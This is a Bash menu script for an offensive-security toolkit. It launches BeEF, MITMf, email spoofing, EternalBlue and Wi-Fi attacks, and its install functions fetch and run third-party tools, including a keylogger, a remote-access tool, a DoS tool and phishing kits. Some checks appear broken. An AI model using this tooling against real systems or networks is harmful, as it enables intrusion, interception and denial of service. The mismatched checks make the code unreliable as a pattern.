					if [[ "$INSTALL" = "install" ]]
					then
						install_mitmf
					fi
				fi
				cd
			else
				if [[ "$inter" = 1 ]]
				then
					echo -e ""$RS"No interface selected"$CE""
				fi
				if [[ "$tarer" = 1 ]]
				then
					echo -e ""$RS"No target selected"$CE""
					sleep 1
				fi
				sleep 2
			fi
		elif [[ "$AEB" = 3 ]]
		then
			if [[ "$inter" = 1 ]]
			then
				echo -e ""$RS"No interface selected"$CE""
				sleep 2
				continue
			fi
			cd /usr/share/beef-xss 
			beefrunning=1
			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
			cd
		elif [[ "$AEB" = 0 ]]
		then
			clear
			exit
		elif [[ "$AEB" = 1 ]]
		then
			while true
			do
				clear
				TERMINALTITLE="Select interface"
				dash_calc
				printf '\033]2;SELECT INTERFACE\a'
				TT=$(ifconfig | grep "$WLANN:")
				if [[ "$TT" != "" ]]
				then
					echo -e ""$YS" 1"$CE") "$WLANN""
				else
					echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
				fi
				TT=$(ifconfig | grep "$ETH:")
				if [[ "$TT" != "" ]]
				then
					echo -e ""$YS" 2"$CE") "$ETH""
				else
					echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
				fi
				echo -e ""$YS" 3"$CE") Manually type an interface"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read CI
				if [[ "$CI" = 1 ]]
				then
					TT=$(ifconfig | grep "$WLANN:")
					if [[ "$TT" != "" ]]
					then
						SINT="$WLANN"
						inter=0
						break
					else
						inter=1
						echo -e ""$RS"Could not find this interface"$CE""
						sleep 2
						continue
					fi
				elif [[ "$CI" = 2 ]]
				then
					TT=$(ifconfig | grep "$ETH:")
					if [[ "$TT" != "" ]]
					then
						SINT="$ETH"
						inter=0
						break
					else
						inter=1
						echo -e ""$RS"Could not find this interface"$CE""
						sleep 2
						continue
					fi
				elif [[ "$CI" = 3 ]]
				then
					echo -e "Interface to use: "
					read ITU
					TT=$(ifconfig | grep "$ITU:")
					if [[ "$TT" != "" ]]
					then
						SINT="$ITU"
						inter=0
						break
					else
						echo -e ""$RS"Could not find this interface"$CE""
						echo -e "Do you still want to use it?"$YNNO": "
						read SU
						if [[ "$SU" = "y" ]]
						then
							SINT="$ITU"
							inter=0
							break
						else
							continue
						fi
					fi
				elif [[ "$CI" = "b" ]]
				then
					clear
					break
				fi
			done
			
		#if inter=1 then error
		fi
	done
}
function settings_menu
{
	if [[ ! -d "$LPATH"/settings ]]
	then
		mkdir "$LPATH"/settings 
	fi
	clear
	while true
	do
		clear
		TERMINALTITLE="SETTINGS"
		dash_calc
		printf '\033]2;SETTINGS\a'
		echo -e ""$YS" 1"$CE") Change logo color"
		echo -e ""$YS" 2"$CE") Howdoi settings"
		if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
		then
			read ALFA < "$LPATH"/settings/AWUS036ACH.txt
		else
			ALFA="no"
		fi
		echo -e ""$YS" 3"$CE") ALFA AWUS036ACH support                      $ALFA"
		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
		then
			read IGN < "$LPATH"/settings/ignorenegativeone.txt
		else
			IGN="no"
		fi
		echo -e ""$YS" 4"$CE") Ignore negative one when deauthing           $IGN"
		if [[ -f "$LPATH"/settings/startmac.txt ]]
		then
			read STARTMAC < "$LPATH"/settings/startmac.txt
		else
			STARTMAC="00:11:22:33:44:55"
		fi
		echo -e ""$YS" 5"$CE") MAC to change to,when starting monitor       $STARTMAC"	
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS" 0"$CE") Exit"
		echo -e "Choose: "
		read SET
		clear
		if [[ "$SET" = "back" || "$SET" = "b" || "$SET" = "00" ]]
		then
			BACKL=1
			break
		elif [[ "$SET" = 0 ]]
		then
			exit
		elif [[ "$SET" = 5 ]]
		then
			clear
			echo -e "Type new MAC("$YS"Enter"$CE"="$DEFMAC"): "
			read NEWMAC
			if [[ "$NEWMAC" = "" ]]
			then
				echo "$DEFMAC" > "$LPATH"/settings/startmac.txt
			else
				sizemac=${#NEWMAC}
				if [[ "$sizemac" != 17 ]]
				then
					echo -e ""$RS"Invalid MAC. Setting it back to default"$CE""
					sleep 4
				else
					echo $NEWMAC > "$LPATH"/settings/startmac.txt
				fi
			fi
		elif [[ "$SET" = 4 ]]
		then
			if [[ "$IGN" = "yes" ]]
			then
				IGN="no"
			else
				IGN="yes"
			fi
			echo -e "$IGN" > "$LPATH"/settings/ignorenegativeone.txt
		elif [[ "$SET" = 3 ]]
		then
			if [[ "$ALFA" = "yes" ]]
			then
				ALFA="no"
			else
				ALFA="yes"
			fi
			echo -e "$ALFA" > "$LPATH"/settings/AWUS036ACH.txt
		elif [[ "$SET" = 2 ]]
		then
			while true
			do
				clear
				if [[ -f "$LPATH"/settings/dispfull.txt ]]
				then
					read dispfull < "$LPATH"/settings/dispfull.txt
				else
					dispfull="false"
				fi
				if [[ -f "$LPATH"/settings/colorout.txt ]]
				then
					read colorout < "$LPATH"/settings/colorout.txt
				else
					colorout="false"
				fi
				if [[ -f "$LPATH"/settings/onlylink.txt ]]
				then
					read onlylink < "$LPATH"/settings/onlylink.txt
				else
					onlylink="false"
				fi
				if [[ -f "$LPATH"/settings/numofans.txt ]]
				then
					read numofans < "$LPATH"/settings/numofans.txt
				else
					numofans="1"
				fi
				echo -e ""$YS" 1"$CE") Display the full answer text              "$dispfull""
				echo -e ""$YS" 2"$CE") Colorized output                          "$colorout""
				echo -e ""$YS" 3"$CE") Display only the answer link              "$onlylink""
				echo -e ""$YS" 4"$CE") Number of answers to return               "$numofans""
				echo -e ""$YS" 5"$CE") Clear the cache"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read HOWCH
				if [[ "$HOWCH" = 1 ]]
				then
					if [[ "$dispfull" = "false" ]]
					then
						dispfull="true"
					else
						dispfull="false"
					fi
					echo "$dispfull" > "$LPATH"/settings/dispfull.txt
				elif [[ "$HOWCH" = 2 ]]
				then
					if [[ "$colorout" = "false" ]]
					then
						colorout="true"
					else
						colorout="false"
					fi
					echo "$colorout" > "$LPATH"/settings/colorout.txt
				elif [[ "$HOWCH" = 3 ]]
				then
					if [[ "$onlylink" = "false" ]]
					then
						onlylink="true"
					else
						onlylink="false"
					fi
					echo "$onlylink" > "$LPATH"/settings/onlylink.txt
				elif [[ "$HOWCH" = 4 ]]
				then
					echo -e "Type number of answers to return: "
					read numofans
					echo "$numofans" > "$LPATH"/settings/numofans.txt
				elif [[ "$HOWCH" = 5 ]]
				then
					howdoi -C
				elif [[ "$HOWCH" = "b" || "$HOWCH" = "back" ]]
				then
					break
				elif [[ "$HOWCH" = 00 ]]
				then
					exec bash $0
				elif [[ "$HOWCH" = 0 ]]
				then
					exit
				fi
			done
		elif [[ "$SET" = 1 ]]
		then
			TERMINALTITLE="LOGO COLORS"
			dash_calc
			echo -e ""$YS" 1"$CE") Light Red (default)     "$RS"SAMPLE"$CE""
			echo -e ""$YS" 2"$CE") Red                     "$DRS"SAMPLE"$CE""
			echo -e ""$YS" 3"$CE") Light Purple            "$LPS"SAMPLE"$CE""
			echo -e ""$YS" 4"$CE") Purple                  "$PS"SAMPLE"$CE""
			echo -e ""$YS" 5"$CE") Light Green             "$LGNS"SAMPLE"$CE""
			echo -e ""$YS" 6"$CE") Green                   "$GNS"SAMPLE"$CE""
			echo -e ""$YS" 7"$CE") Light Cyan              "$LCYS"SAMPLE"$CE""
			echo -e ""$YS" 8"$CE") Cyan                    "$CYS"SAMPLE"$CE""
			echo -e ""$YS" 9"$CE") Light Blue              "$LBS"SAMPLE"$CE""
			echo -e ""$YS"10"$CE") Blue                    "$BS"SAMPLE"$CE""
			echo -e ""$YS"11"$CE") Light Gray              "$LGYS"SAMPLE"$CE""
			echo -e ""$YS"12"$CE") Dark Gray               "$DGYS"SAMPLE"$CE""
			echo -e ""$YS"13"$CE") Yellow                  "$YS"SAMPLE"$CE""
			echo -e ""$YS"14"$CE") Brown                   "$BRS"SAMPLE"$CE""
			echo -e ""$YS"15"$CE") White                   "$WHS"SAMPLE"$CE""
			echo -e ""$YS"16"$CE") Black                   "$BLS"SAMPLE"$CE""
			echo -e "Choose: "
			read LC
			if [[ "$LC" = 1 ]]
			then
				echo -e "\e[1;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 2 ]]
			then
				echo -e "\e[0;31m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 3 ]]
			then
				echo -e "\e[1;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 4 ]]
			then
				echo -e "\e[0;35m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 5 ]]
			then
				echo -e "\e[1;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 6 ]]
			then
				echo -e "\e[0;32m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 7 ]]
			then
				echo -e "\e[1;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 8 ]]
			then
				echo -e "\e[0;36m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 9 ]]
			then
				echo -e "\e[1;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 10 ]]
			then
				echo -e "\e[0;34m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 11 ]]
			then
				echo -e "\e[0;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 12 ]]
			then
				echo -e "\e[1;30m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 13 ]]
			then
				echo -e "\e[1;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 14 ]]
			then
				echo -e "\e[0;33m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 15 ]]
			then
				echo -e "\e[1;37m" > "$LPATH"/settings/logocolor.txt
			elif [[ "$LC" = 16 ]]
			then
				echo -e "\e[0;30m" > "$LPATH"/settings/logocolor.txt
			fi		
		fi
	done
}
function main_options
{
	if [[ "$YORNAA" = "0" ]]
	then
		exit
	elif [[ "$YORNAA" = "scan" ]]
	then
		if [[ ! -f /usr/bin/arp-scan ]]
		then
			echo -e ""$BS"Installing arp-scan"$CE""
			install_arp_scan
			clear
		fi
		ip_scan wlan0 2
	elif [[ "$YORNAA" = "19" ]]
	then
		echo -e ""$BS"IP:"$CE" "
		read IPG
		clear
		geolocate_ip "$IPG"
	elif [[ "$YORNAA" = "18" ]]
	then
		browser_exploiting
	elif [[ "$YORNAA" = "m" ]]
	then
		mitmf_hook
	elif [[ "$YORNAA" = "g" ]]
	then
		find_gateways
	elif [[ "$YORNAA" = "l" ]]
	then
		local_ips
	elif [[ "$YORNAA" = "17" ]]
	then
		if [[ ! -f "/usr/local/bin/howdoi" ]]
		then
			echo -e ""$RS"Howdoi is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_howdoi
			fi
		else
			clear
			if [[ -f "$LPATH"/settings/dispfull.txt ]]
			then
				read dispfull < "$LPATH"/settings/dispfull.txt
				if [[ "$dispfull" = "true" ]]
				then
					df="-a"
				fi
			else
				df=""
			fi
			if [[ -f "$LPATH"/settings/colorout.txt ]]
			then
				read colorout < "$LPATH"/settings/colorout.txt
				if [[ "$colorout" = "true" ]]
				then
					co="-c"
				fi
			else
				co=""
			fi
			if [[ -f "$LPATH"/settings/onlylink.txt ]]
			then
				read onlylink < "$LPATH"/settings/onlylink.txt
				if [[ "$onlylink" = "true" ]]
				then
					ol="-l"
				fi
			else
				ol=""
			fi
			if [[ -f "$LPATH"/settings/numofans.txt ]]
			then
				read numofans < "$LPATH"/settings/numofans.txt
				if [[ "$numofans" = "true" ]]
				then
					na="-n "$numofans""
				fi
			else
				na=""
			fi
			echo -e "How do i :  "
			read HOW
			howdoi $co $na $ol $df $HOW
		fi
	elif [[ "$YORNAA" = "settings" || "$YORNAA" = "s" ]]
	then
		settings_menu
	elif [[ "$YORNAA" = "16" ]]
	then
		ngrok_option
		BACKL=1
	elif [[ "$YORNAA" = "donate" || "$YORNAA" = "d" ]]
	then
		donate_option
#------services
	elif [[ "$YORNAA" = "pstart" ]]
	then
		service postgresql start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "pstop" ]]
	then
		service postgresql stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nstart" ]]
	then
		service network-manager start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nstop" ]]
	then
		service network-manager stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "astart" ]]
	then
		service apache2 start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "astop" ]]
	then
		service apache2 stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
	elif [[ "$YORNAA" = "nessusstart" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd start && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
	elif [[ "$YORNAA" = "nessusstop" ]]
	then
		if [[ -f /etc/init.d/nessusd ]]
		then
			/etc/init.d/nessusd stop && echo -e ""$YS"Done"$CE"" || echo -e ""$RS"Error"$CE""
		else
			echo -e ""$RS"Nessus is not already installed."$CE""
			sleep 2
		fi
#-------------
	elif [[ "$YORNAA" = "15" ]]
	then
		BACKL="1"
		spoof_email
	elif [[ "$YORNAA" = "ks" ]]
	then
		keyboard_shortcuts
	elif [[ "$YORNAA" = "interface" ]]
	then
		interface_menu
	elif [[ "$YORNAA" = "9" ]]
	then
		tools_menu
	elif [[ "$YORNAA" = "l" ]]
	then
		clear 
		exec bash "$0"
	elif [[ "$YORNAA" = "gg" ]]
	then
		geany /bin/brscript/l
	elif [[ "$YORNAA" = "1" ]]
	then
		enable_wlan
	elif [[ "$YORNAA" = "d1" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface to disable."$CE""
		else
			disable_wlan
		fi
	elif [[ "$YORNAA" = "2" ]]
	then
		check_wlans
		if [[ "$WLANCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANN interface."$CE""
		else
			echo -e "Enabling $WLANNM..."
			echo -e "Killing services..."
			(airmon-ng check kill &> /dev/null && echo -e "Done." ) || echo -e ""$RS"Error killing services"$YS""
			echo -e "Starting monitor mode..."
			(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
		fi
	elif [[ "$YORNAA" = "d2" ]]
	then
		check_wlans
		if [[ "$WLANMCHECKING" = "" ]]
		then
			echo -e ""$RS"Error. Could find $WLANNM interface."$CE""
		else
			stop_monitor
		fi
	elif [[ "$YORNAA" = "3" ]]
	then
		change_mac
	elif [[ "$YORNAA" = "d3" ]]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [[ "$YORNAA" = "4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Enabling anonym8..."
			anonym8 start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d4" ]]
	then
		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
		then
			echo -e ""$RS"Anonym8 is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonym8
			fi
		else
			echo -e "Disabling anonym8..."
			anonym8 stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Enabling anonsurf..."
			anonsurf start
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d5" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Disabling anonsurf..."
			anonsurf stop
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Status of anonsurf..."
			anonsurf status
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "d6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonsurf change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "r6" ]]
	then
		if [[ ! -f "/usr/bin/anonsurf" ]]
		then
			echo -e ""$RS"Anonsurf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_anonsurf
			fi
		else
			echo -e "Restarting anonsurf..."
			anonym8 change
			echo -e "Done."
		fi
	elif [[ "$YORNAA" = "7" ]]
	then
		public_ip
	elif [[ "$YORNAA" = "8" ]]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [[ "$YORNAA" = "10" || "$YORNAA" = "11" || "$YORNAA" = "12" ]]
	then
		new_terminal
	elif [[ "$YORNAA" = "13" ]]
	then
		mitm_menu
	elif [[ "$YORNAA" = "14" ]]
	then
		metasploit_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		kill -9 $PPID
		exit
	elif [[ "$YORNAA" = "update" ]]
	then
		printf '\033]2;UPDATE\a'
		clear
		update_brscript
	elif [[ "$YORNAA" = "if" || "$YORNAA" = "ifconfig" ]]
	then
		ifconfig
	elif [[ "$YORNAA" = "changelog" ]]
	then
		clear
		BACKL=1
		cat "$LPATH"/Changelog | head -n 20
		echo -e "$PAKTC"
		$READAK
		clear
	elif [[ "$YORNAA" = "" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$YORNAA" = "errors" ]]
	then
		errors_menu
	elif [[ "$YORNAA" = "etercheck" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue_check
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "eternalblue" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			eternalblue
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "$wififb" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			wififb
		else
			echo -e ""$RS"Wifiphisher is not installed.Type '"$CE""$YS"install"$CE""$RS"' to install it."$CE""
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			fi
		fi
	elif [[ "$YORNAA" = "start" ]]
	then		
		start_menu
#----------
	elif [[ "$YORNAA" = "stop" ]]
	then
		stop_menu
	elif [[ "$YORNAA" = "exit" ]]
	then
		clear
		exit
	fi
####check if it is ks
var1=1
check_if_ks
####
}
#----------------TOOLS---------------
	function install_fluxion
	{
		if [[ -d "/root/fluxion" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/fluxion
		fi
		echo -e "Installing fluxion"
		echo -e "Tool by Deltaxflux"
		sleep 1
		cd
		wget https://fluxion.tk/fluxion-unstable.zip
		apt-get install -y unzip
		clear
		unzip /root/fluxion*.zip -d /root
		cd /root/fluxion/install
		chmod +x install.sh
		./install.sh	
	}
	function install_wifite
	{
		apt-get install -y wifite
	}
	function install_wifiphisher
	{
		if [[ -d "/root/wifiphisher" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/wifiphisher
		fi
		echo -e "Installing Wifiphisher"
		echo -e "Tool idea by Dan McInerney"
		sleep 1
		cd
		git clone https://github.com/wifiphisher/wifiphisher.git
		cd wifiphisher
		sudo python setup.py install
		sleep 1
	}
	function install_zatacker
	{
		echo -e "I cannot install Zatacker. Please google how to do that yourself."
		echo -e "PAKTGB"
		read
	}
	function install_morpheus
	{
		if [[ -d "/root/morpheus" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/morpheus
		fi				
		echo -e "Installing Morpheus"
		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
		sleep 1
		cd
		git clone https://github.com/r00t-3xp10it/morpheus.git
		cd morpheus
		chmod +x morpheus.sh
	}
	function install_osrframework
	{
		pip install osrframework
	}
	function install_hakku
	{
		if [[ -d "/root/hakkuframework" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/hakkuframework
		fi		
		echo -e "Installing Hakku"
		echo -e "Tool by 4shadoww"
		sleep 1
		cd
		git clone https://github.com/4shadoww/hakkuframework.git
		cd hakkuframework
		chmod +x hakku
		chmod +x install
	}
	function install_trity
	{
		if [[ -d "/root/Trity" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Trity
		fi		
		echo -e "Installing Trity"
		echo -e "Tool by Toxic-ig"
		sleep 1
		git clone https://github.com/toxic-ig/Trity.git
		cd Trity
		sudo python install.py	
	}
	function install_cupp
	{
		if [[ -d "/root/cupp" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/cupp
		fi			
		echo -e "Installing Cupp"
		echo -e "Tool by Muris Kurgas"
		sleep 1
		cd
		git clone https://github.com/Mebus/cupp.git
		cd cupp
		chmod +x cupp.py	
	}
	function install_dracnmap
	{
		if [[ -d "/root/Dracnmap" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Dracnmap
		fi			
		echo -e "Installing Dracnmap"
		echo -e "Tool by Edo -maland-"
		cd
		git clone https://github.com/Screetsec/Dracnmap.git
		cd Dracnmap
		chmod +x Dracnmap.sh
	}
	function install_fern
	{
		if [[ -d "/root/Fern-Wifi-Cracker" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/Fern-Wifi-Cracker
		fi		
		echo -e "Installing Fern"
		echo -e "Tool by Savio-code"
		sleep 1
		cd 
		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
		cd Fern-Wifi-Cracker
		chmod +x execute.py	
	}
	function install_kickthemout
	{
		if [[ -d "/root/kickthemout" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kickthemout
		fi		
		echo -e "Installing Kichthemout"
		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
		sleep 2
		apt-get install -y nmap
		git clone https://github.com/k4m4/kickthemout.git
		cd kickthemout/
		sudo python -m pip install -r requirements.txt
	}
	function install_ghostphisher
	{
		if [[ -d "/root/ghost-phisher" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ghost-phisher
		fi			
		echo -e "Installing Ghost-Phisher"
		echo -e "Tool by Savio-code"
		sleep 1
		cd
		git clone https://github.com/savio-code/ghost-phisher.git
		sleep 1
		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
	}
	function install_theeye
	{
		if [[ -d "/root/The-Eye" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/The-Eye
		fi			
		echo -e "Installing The Eye"
		echo -e "Tool by EgeBalci"
		sleep 1
		cd
		git clone https://github.com/EgeBalci/The-Eye.git
		cd The-Eye
		chmod +x TheEye	
	}
	function install_xerxes
	{
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/xerxes
		fi			
		echo -e "Installing Xerxes"
		echo -e "Tool by zanyarjamal"
		cd
		git clone https://github.com/zanyarjamal/xerxes
		cd xerxes
		gcc xerxes.c -o xerxes	
	}
	function install_mdk3
	{
		if [[ -d "/root/mdk3-master" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/mdk3-master
		fi				
		echo -e "Installing Mdk3-master"
		echo -e "Tool by Musket Developer"
		cd
		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
		cd /root/mdk3-master
		make
		make install
	}
	function install_katana
	{
		if [[ -d "/root/KatanaFramework" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/KatanaFramework
		fi				
		echo -e "Installing Katana framework"
		echo -e "Tool by PowerScript"
		cd
		git clone https://github.com/PowerScript/KatanaFramework.git
		cd KatanaFramework
		sh dependencies
		python install
	}
	function install_airgeddon
	{
		if [[ -d "/root/airgeddon" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/airgeddon
		fi
		echo -e "Installing..."
		sleep 1
		echo -e "Installing Airgeddon"
		echo -e "Tool by v1s1t0r1sh3r3"
		cd
		git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
		cd airgeddon
		chmod +x airgeddon.sh
	}
	function install_4nonimizer
	{
		if [[ -d "/root/4nonimizer" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/4nonimizer
		fi		
		echo -e "Installing 4nonimizer"
		echo -e "Tool by Hackplayers"
		cd
		git clone https://github.com/Hackplayers/4nonimizer.git
		cd 4nonimizer
		chmod +x 4nonimizer
		./4nonimizer install
		clear
		cd
		apt-get install -y python-pip
		apt-get install -y php-curl
		gem install pcaprub
		gem install packetfu	
	}
	function install_beelogger
	{
		if [[ -d "/root/BeeLogger" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/BeeLogger
		fi	
		echo -e "Installing BeeLogger"
		echo -e "Tool by Alisson Moretto - 4w4k3"
		cd
		git clone https://github.com/4w4k3/BeeLogger.git
		cd BeeLogger
		chmod +x install.sh
		./install.sh
		cd
		apt-get install -y python-pip
		apt-get install -y php-curl
		gem install pcaprub
		gem install packetfu
		clear
	}
	function install_ezsploit
	{
		if [[ -d "/root/ezsploit" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/ezsploit
		fi				
		echo -e "Installing Ezsploit"
		echo -e "Tool by rand0m1ze"
		git clone https://github.com/rand0m1ze/ezsploit.git
		cd ezsploit/
		chmod +x ezsploit.sh
	}
	function install_pupy
	{
		if [[ -d "/root/pupy" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/pupy
		fi			
		echo -e "Installing Pupy"
		echo -e "Tool by n1nj4sec"
		cd
		git clone https://github.com/n1nj4sec/pupy.git
		cd /root/pupy
		git submodule init
		git submodule update
		cd /root/pupy/pupy
		pip install -r requirements.txt
		cd
	}
	function install_zirikatu
	{
		if [[ -d "/root/zirikatu" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/zirikatu
		fi		
		echo -e "Installing Zirikatu"
		echo -e "Tool by pasahitz"
		cd
		git clone https://github.com/pasahitz/zirikatu.git
		cd zirikatu
		chmod +x zirikatu.sh
	}
	function install_wifiautopwner
	{
		if [[ -d "/root/WiFi-autopwner" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/WiFi-autopwner
		fi		
		echo -e "Installing WiFi-autopwner"
		echo -e "Tool by Mi-Al"
		cd
		git clone https://github.com/Mi-Al/WiFi-autopwner.git
	}
	function install_bully
	{
		if [[ -d "/root/bully" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/bully
		fi				
		echo -e "Installing Bully"
		echo -e "Tool by Aanarchyy"
		cd
		git clone https://github.com/aanarchyy/bully.git
		cd /root/bully/src
		make
		sudo make install	
		cd	
	}
	function install_anonsurf
	{
		if [[ -d "/root/kali-anonsurf" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
			rm -r /root/kali-anonsurf
		fi		
		cd
		echo -e "Installing Anonsurf"
		echo -e "Tool by Und3rf10w"
		git clone https://github.com/Und3rf10w/kali-anonsurf.git
		cd kali-anonsurf
		chmod +x installer.sh
		./installer.sh
		sleep 1
		cd
	}
	function install_anonym8
	{
		if [[ -d "/root/anonym8" ]]
		then
			echo -e "Removing old..."
			echo -e "$PAKTC"
			$READAK
